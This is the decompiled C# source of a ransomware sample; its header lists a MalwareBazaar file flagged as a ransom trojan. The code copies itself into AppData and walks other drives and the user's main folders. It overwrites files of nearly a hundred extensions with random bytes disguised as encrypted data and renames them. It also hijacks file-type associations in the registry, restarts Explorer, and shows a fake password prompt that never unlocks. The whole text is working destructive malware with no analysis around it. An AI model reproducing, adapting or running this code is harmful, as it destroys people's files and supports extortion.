// Decompiled with JetBrains decompiler
// Type: LoginModern.login
// Assembly: UnlockYourFiles, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C4D1DDED-44E7-498E-9254-68896F7E2757
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Crypmodng.gen-5847c10d87797bc92bbe204885b79204b491dafe0b591b1277a5ec39e11db532.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using UnlockYourFiles.Login;

namespace LoginModern
{
  public class login : Form
  {
    private static string string_0 = Process.GetCurrentProcess().MainModule.FileName;
    private static string string_1 = "BascordApp";
    private static string string_2 = "TypeYourPassword";
    private static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + login.string_1 + "\\";
    private static string string_4 = login.string_3 + login.string_2 + ".exe";
    private static string string_5 = login.string_3 + "filesx0\\";
    private static Random random_0 = new Random();
    private static string string_6 = login.random_0.Next(111, 999).ToString();
    private static Random random_1 = new Random();
    private static Func<string, char> func_0;
    private static Func<string, DirectoryInfo> func_1;
    private static Func<DirectoryInfo, bool> func_2;
    private static Func<DirectoryInfo, bool> func_3;
    private static Func<DirectoryInfo, string> func_4;
    internal int int_0 = 0;
    internal string string_7 = Environment.UserName;
    internal string string_8 = "C:\\Users\\";
    internal string[] string_9 = new string[97]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".cs",
      ".mp3",
      ".mp4",
      ".dwg",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".lnk",
      ".iso",
      ".7-zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".mpeg",
      ".mp3",
      ".mpg",
      ".core",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".mp3",
      ".cer",
      ".bak",
      ".backup",
      ".accdb",
      ".bay",
      ".p7c",
      ".exif",
      ".m4a",
      ".wma",
      ".flv",
      ".sie",
      ".sum",
      ".ibank",
      ".wallet",
      ".rb",
      ".crt",
      ".xlsm",
      ".xlsb",
      ".7z",
      ".cpp",
      ".java",
      ".jpe",
      ".blob",
      ".wps",
      ".docm",
      ".wav",
      ".3gp",
      ".webm",
      ".m4v",
      ".amv",
      ".m4p",
      ".svg",
      ".ods",
      ".bk",
      ".vdi",
      ".vmdk",
      ".jsp"
    };
    internal string[] string_10 = new string[9]
    {
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".png",
      ".jpg",
      ".png",
      "jpeg",
      ".zip"
    };
    internal IContainer icontainer_0 = (IContainer) null;
    internal Panel panel1;
    internal TextBox txtpass;
    internal Label label1;
    internal Button btnlogin;
    internal PictureBox btnCerrar;
    internal PictureBox btnMinimizar;
    internal PictureBox pictureBox1;
    internal LinkLabel linkregis;
    internal Label label2;

    public login() => this.InitializeComponent();

    private void txtpass_Enter(object sender, EventArgs e)
    {
      if (!(this.txtpass.Text == "Type tour password..."))
        return;
      this.txtpass.Text = "";
      this.txtpass.ForeColor = System.Drawing.Color.LightGray;
      this.txtpass.UseSystemPasswordChar = true;
    }

    private void txtpass_Leave(object sender, EventArgs e)
    {
      if (!(this.txtpass.Text == ""))
        return;
      this.txtpass.Text = "Type tour password...";
      this.txtpass.ForeColor = System.Drawing.Color.DimGray;
      this.txtpass.UseSystemPasswordChar = false;
    }

    private void btnCerrar_Click(object sender, EventArgs e) => Application.Exit();

    private void btnMinimizar_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void linkregis_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      this.TopMost = false;
      new registro().Show();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private void login_Load(object sender, EventArgs e)
    {
      if (login.string_0.Contains(login.string_1))
      {
        this.linkregis.Select();
        this.TopMost = true;
        this.Opacity = 90.0;
      }
      else
      {
        bool createdNew;
        Mutex mutex = new Mutex(true, "user45f56", out createdNew);
        if (!createdNew)
          Environment.Exit(0);
        this.Opacity = 0.0;
        this.FormBorderStyle = FormBorderStyle.None;
        this.ShowInTaskbar = false;
        if (!login.smethod_1())
          return;
        login.smethod_2(login.string_6, login.string_4, login.string_2 + ".exe");
        this.method_1();
        login.smethod_2(login.string_6, login.string_4, login.string_2 + ".exe");
        this.method_2();
        Environment.Exit(0);
      }
    }

    private void panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void label2_Click(object sender, EventArgs e)
    {
    }

    private void btnlogin_Click(object sender, EventArgs e)
    {
      this.TopMost = false;
      if ((this.txtpass.Text == "" ? 0 : (!(this.txtpass.Text == "Type tour password...") ? 1 : 0)) == 0)
      {
        msgbox msgbox = new msgbox();
        msgbox.Hide();
        msgbox.changeLabel("Please provide password!");
        int num = (int) msgbox.ShowDialog();
        msgbox.Dispose();
      }
      else
      {
        Thread.Sleep(500);
        msgbox msgbox = new msgbox();
        msgbox.changeLabel("Password is incorrect!");
        int num = (int) msgbox.ShowDialog();
        msgbox.Dispose();
      }
    }

    private static byte[] smethod_0(int int_1)
    {
      Random random = new Random();
      ++int_1;
      byte[] buffer = new byte[int_1];
      random.NextBytes(buffer);
      return buffer;
    }

    public static string RandomString(int length)
    {
      IEnumerable<string> source = Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length);
      if (login.func_0 == null)
        login.func_0 = new Func<string, char>(login.smethod_3);
      Func<string, char> func0 = login.func_0;
      return new string(source.Select<string, char>(func0).ToArray<char>());
    }

    public static string Base64Encode(string plainText)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(plainText);
      return "<EncyptedKey>" + login.RandomString(31) + "<EncyptedKey> " + Convert.ToBase64String(bytes);
    }

    private void method_0(string string_11)
    {
      try
      {
        string[] files = Directory.GetFiles(string_11);
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if (((IEnumerable<string>) this.string_9).Contains<string>(extension.ToLower()))
            {
              FileInfo fileInfo = new FileInfo(files[index]);
              if (fileInfo.Length < 1098576L)
              {
                if (this.int_0 < 4 && (!Directory.Exists(login.string_5) ? 1 : (!((IEnumerable<string>) this.string_10).Contains<string>(extension.ToLower()) ? 1 : 0)) == 0)
                {
                  File.Move(files[index], login.string_5 + fileName);
                  File.Delete(files[index]);
                  ++this.int_0;
                }
                if (File.Exists(files[index]))
                {
                  string plainText = Encoding.UTF8.GetString(login.smethod_0(Convert.ToInt32(fileInfo.Length) / 3));
                  File.WriteAllText(files[index], login.Base64Encode(plainText));
                  File.Move(files[index], files[index] + "." + login.string_6);
                }
              }
              else
              {
                string plainText = Encoding.UTF8.GetString(login.smethod_0(418576));
                File.WriteAllText(files[index], login.Base64Encode(plainText));
                File.Move(files[index], files[index] + "." + login.string_6);
              }
            }
          }
          catch
          {
          }
        }
        string[] directories = Directory.GetDirectories(string_11);
        if (login.func_1 == null)
          login.func_1 = new Func<string, DirectoryInfo>(login.smethod_4);
        Func<string, DirectoryInfo> func1 = login.func_1;
        IEnumerable<DirectoryInfo> source1 = ((IEnumerable<string>) directories).Select<string, DirectoryInfo>(func1);
        if (login.func_2 == null)
          login.func_2 = new Func<DirectoryInfo, bool>(login.smethod_5);
        Func<DirectoryInfo, bool> func2 = login.func_2;
        IEnumerable<DirectoryInfo> source2 = source1.Where<DirectoryInfo>(func2);
        if (login.func_3 == null)
          login.func_3 = new Func<DirectoryInfo, bool>(login.smethod_6);
        Func<DirectoryInfo, bool> func3 = login.func_3;
        IEnumerable<DirectoryInfo> source3 = source2.Where<DirectoryInfo>(func3);
        if (login.func_4 == null)
          login.func_4 = new Func<DirectoryInfo, string>(login.smethod_7);
        Func<DirectoryInfo, string> func4 = login.func_4;
        foreach (string string_11_1 in source3.Select<DirectoryInfo, string>(func4).ToArray<string>())
          this.method_0(string_11_1);
      }
      catch (Exception ex)
      {
      }
    }

    private void method_1()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
          this.method_0(drive.ToString());
      }
      string string_11_1 = this.string_8 + this.string_7 + "\\Desktop";
      string string_11_2 = this.string_8 + this.string_7 + "\\Links";
      string string_11_3 = this.string_8 + this.string_7 + "\\Contacts";
      string string_11_4 = this.string_8 + this.string_7 + "\\Desktop";
      string string_11_5 = this.string_8 + this.string_7 + "\\Documents";
      string string_11_6 = this.string_8 + this.string_7 + "\\Downloads";
      string string_11_7 = this.string_8 + this.string_7 + "\\Pictures";
      string string_11_8 = this.string_8 + this.string_7 + "\\Music";
      string string_11_9 = this.string_8 + this.string_7 + "\\OneDrive";
      string string_11_10 = this.string_8 + this.string_7 + "\\Saved Games";
      string string_11_11 = this.string_8 + this.string_7 + "\\Favorites";
      string string_11_12 = this.string_8 + this.string_7 + "\\Searches";
      string string_11_13 = this.string_8 + this.string_7 + "\\Videos";
      this.method_0(string_11_1);
      this.method_0(string_11_2);
      this.method_0(string_11_3);
      this.method_0(string_11_4);
      this.method_0(string_11_5);
      this.method_0(string_11_6);
      this.method_0(string_11_7);
      this.method_0(string_11_8);
      this.method_0(string_11_9);
      this.method_0(string_11_10);
      this.method_0(string_11_11);
      this.method_0(string_11_12);
      this.method_0(string_11_13);
    }

    private static bool smethod_1()
    {
      if (!Directory.Exists(login.string_3))
        Directory.CreateDirectory(login.string_3);
      if (!File.Exists(login.string_4))
      {
        File.Copy(login.string_0, login.string_4);
      }
      else
      {
        try
        {
          File.Delete(login.string_4);
          File.Copy(login.string_0, login.string_4);
        }
        catch
        {
        }
      }
      if (!Directory.Exists(login.string_5))
      {
        Directory.CreateDirectory(login.string_5);
      }
      else
      {
        Directory.Delete(login.string_5, true);
        Directory.CreateDirectory(login.string_5);
      }
      return File.Exists(login.string_4);
    }

    private void method_2()
    {
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (process.MainModule.FileName.ToLower().EndsWith(":\\windows\\explorer.exe"))
          {
            process.Kill();
            break;
          }
        }
        catch
        {
        }
      }
      Process.Start("explorer.exe");
    }

    private static void smethod_2(string string_11, string string_12, string string_13)
    {
      try
      {
        using (RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\", true))
        {
          using (RegistryKey subKey1 = registryKey1.CreateSubKey("." + string_11))
          {
            using (RegistryKey subKey2 = registryKey1.CreateSubKey(string_11 + "_auto_file"))
            {
              using (RegistryKey subKey3 = subKey2.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command"))
              {
                using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts\\", true))
                {
                  using (RegistryKey subKey4 = registryKey1.CreateSubKey("Applications"))
                  {
                    using (RegistryKey subKey5 = subKey4.CreateSubKey(string_13))
                    {
                      using (RegistryKey subKey6 = subKey5.CreateSubKey("shell").CreateSubKey("open").CreateSubKey("command"))
                      {
                        using (RegistryKey subKey7 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\." + string_11))
                        {
                          using (RegistryKey registryKey3 = subKey7.OpenSubKey("UserChoice"))
                          {
                            subKey1.SetValue("", (object) (string_11 + "_auto_file"), RegistryValueKind.String);
                            registryKey1.SetValue("", (object) (string_11 + "_auto_file"), RegistryValueKind.String);
                            registryKey1.CreateSubKey(string_11 + "_auto_file");
                            subKey3.SetValue("", (object) ("\"" + string_12 + "\" \"%1\""));
                            registryKey2.SetValue(string_11 + "_auto_file_." + string_11, (object) 0);
                            registryKey2.SetValue("Applications\\" + string_13 + "_." + string_11, (object) 0);
                            subKey6.SetValue("", (object) ("\"" + string_12 + "\" \"%1\""));
                            subKey7.CreateSubKey("OpenWithList").SetValue("a", (object) string_13);
                            subKey7.CreateSubKey("OpenWithProgids").SetValue(string_11 + "_auto_file", (object) "0");
                            if (registryKey3 != null)
                              subKey7.DeleteSubKey("UserChoice");
                            subKey7.CreateSubKey("UserChoice").SetValue("ProgId", (object) ("Applications\\" + string_13));
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        login.SHChangeNotify(134217728U, 0U, IntPtr.Zero, IntPtr.Zero);
      }
      catch
      {
      }
    }

    [DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern void SHChangeNotify(
      uint wEventId,
      uint uFlags,
      IntPtr dwItem1,
      IntPtr dwItem2);

    protected override void Dispose(bool disposing)
    {
      if ((!disposing ? 1 : (this.icontainer_0 == null ? 1 : 0)) == 0)
        this.icontainer_0.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (login));
      this.panel1 = new Panel();
      this.pictureBox1 = new PictureBox();
      this.txtpass = new TextBox();
      this.label1 = new Label();
      this.btnlogin = new Button();
      this.btnCerrar = new PictureBox();
      this.btnMinimizar = new PictureBox();
      this.linkregis = new LinkLabel();
      this.label2 = new Label();
      this.panel1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((ISupportInitialize) this.btnCerrar).BeginInit();
      ((ISupportInitialize) this.btnMinimizar).BeginInit();
      this.SuspendLayout();
      this.panel1.BackColor = System.Drawing.Color.FromArgb(34, 36, 49);
      this.panel1.Controls.Add((Control) this.pictureBox1);
      this.panel1.Dock = DockStyle.Left;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(219, 218);
      this.panel1.TabIndex = 0;
      this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(44, 48);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(115, 119);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.txtpass.BackColor = System.Drawing.Color.FromArgb(15, 15, 15);
      this.txtpass.BorderStyle = BorderStyle.None;
      this.txtpass.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.txtpass.ForeColor = System.Drawing.Color.DimGray;
      this.txtpass.Location = new Point(252, 74);
      this.txtpass.MaxLength = 30;
      this.txtpass.Name = "txtpass";
      this.txtpass.Size = new Size(408, 19);
      this.txtpass.TabIndex = 2;
      this.txtpass.Text = "Type tour password...";
      this.txtpass.Enter += new EventHandler(this.txtpass_Enter);
      this.txtpass.Leave += new EventHandler(this.txtpass_Leave);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.DimGray;
      this.label1.Location = new Point(225, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(396, 29);
      this.label1.TabIndex = 4;
      this.label1.Text = "This file protected with password";
      this.btnlogin.BackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.btnlogin.Cursor = Cursors.Hand;
      this.btnlogin.FlatAppearance.BorderSize = 0;
      this.btnlogin.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(28, 28, 28);
      this.btnlogin.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
      this.btnlogin.FlatStyle = FlatStyle.Flat;
      this.btnlogin.Font = new Font("Arial", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.btnlogin.ForeColor = System.Drawing.Color.LightGray;
      this.btnlogin.Location = new Point(244, (int) sbyte.MaxValue);
      this.btnlogin.Name = "btnlogin";
      this.btnlogin.Size = new Size(408, 40);
      this.btnlogin.TabIndex = 3;
      this.btnlogin.Text = "Unlock File";
      this.btnlogin.UseVisualStyleBackColor = false;
      this.btnlogin.Click += new EventHandler(this.btnlogin_Click);
      this.btnCerrar.BackColor = System.Drawing.Color.FromArgb(15, 15, 15);
      this.btnCerrar.Image = (Image) componentResourceManager.GetObject("btnCerrar.Image");
      this.btnCerrar.Location = new Point(653, 9);
      this.btnCerrar.Name = "btnCerrar";
      this.btnCerrar.Size = new Size(25, 25);
      this.btnCerrar.SizeMode = PictureBoxSizeMode.CenterImage;
      this.btnCerrar.TabIndex = 7;
      this.btnCerrar.TabStop = false;
      this.btnCerrar.Click += new EventHandler(this.btnCerrar_Click);
      this.btnMinimizar.Image = (Image) componentResourceManager.GetObject("btnMinimizar.Image");
      this.btnMinimizar.Location = new Point(622, 9);
      this.btnMinimizar.Name = "btnMinimizar";
      this.btnMinimizar.Size = new Size(25, 25);
      this.btnMinimizar.SizeMode = PictureBoxSizeMode.CenterImage;
      this.btnMinimizar.TabIndex = 8;
      this.btnMinimizar.TabStop = false;
      this.btnMinimizar.Click += new EventHandler(this.btnMinimizar_Click);
      this.linkregis.ActiveLinkColor = System.Drawing.Color.FromArgb(0, 122, 204);
      this.linkregis.AutoSize = true;
      this.linkregis.Cursor = Cursors.Hand;
      this.linkregis.Font = new Font("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.linkregis.LinkColor = System.Drawing.Color.DimGray;
      this.linkregis.Location = new Point(309, 185);
      this.linkregis.Name = "linkregis";
      this.linkregis.Size = new Size(261, 24);
      this.linkregis.TabIndex = 9;
      this.linkregis.TabStop = true;
      this.linkregis.Text = "How can I get password?";
      this.linkregis.LinkClicked += new LinkLabelLinkClickedEventHandler(this.linkregis_LinkClicked);
      this.label2.AutoSize = true;
      this.label2.CausesValidation = false;
      this.label2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Underline, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = System.Drawing.Color.DarkGray;
      this.label2.Location = new Point(252, 96);
      this.label2.Name = "label2";
      this.label2.Size = new Size(391, 13);
      this.label2.TabIndex = 10;
      this.label2.Text = "                                                                                                                                ";
      this.label2.Click += new EventHandler(this.label2_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.FromArgb(15, 15, 15);
      this.ClientSize = new Size(694, 218);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.linkregis);
      this.Controls.Add((Control) this.btnMinimizar);
      this.Controls.Add((Control) this.btnCerrar);
      this.Controls.Add((Control) this.btnlogin);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.txtpass);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (login);
      this.Opacity = 0.0;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Tag = (object) "              ";
      this.Text = "File protected";
      this.Load += new EventHandler(this.login_Load);
      this.panel1.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      ((ISupportInitialize) this.btnCerrar).EndInit();
      ((ISupportInitialize) this.btnMinimizar).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static char smethod_3(string string_11) => string_11[login.random_1.Next(string_11.Length)];

    private static DirectoryInfo smethod_4(string string_11) => new DirectoryInfo(string_11);

    private static bool smethod_5(DirectoryInfo directoryInfo_0) => directoryInfo_0.Attributes.HasFlag((Enum) FileAttributes.Directory);

    private static bool smethod_6(DirectoryInfo directoryInfo_0) => !directoryInfo_0.Attributes.HasFlag((Enum) FileAttributes.System);

    private static string smethod_7(DirectoryInfo directoryInfo_0) => directoryInfo_0.FullName;

    [SecuritySafeCritical]
    static login()
    {
    }
  }
}
